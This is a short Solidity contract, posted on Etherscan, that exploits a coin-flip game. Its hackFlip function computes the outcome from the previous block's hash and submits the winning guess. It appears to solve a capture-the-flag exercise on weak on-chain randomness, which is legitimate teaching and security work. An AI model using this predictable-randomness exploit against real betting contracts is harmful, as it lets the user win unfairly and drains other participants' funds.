/**
 *Submitted for verification at Etherscan.io on 2022-07-21
*/

pragma solidity ^0.6.0;

interface Flipy{
  function flip(bool _guess) external returns (bool);
}

contract Existing  {
    
    address public  dc = 0x848AeBB151B1fbBcE29f6eE1674C215EF0C14D6F;
    Flipy Flipou = Flipy(dc);
    function hackFlip(bool _guess) public {
        
        

        // pre-deteremine the flip outcome
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // If I guessed correctly, submit my guess
        if (side == _guess) {
            Flipou.flip(_guess);
        } else {
        // If I guess incorrectly, submit the opposite
            Flipou.flip(!_guess);
        }
    }
}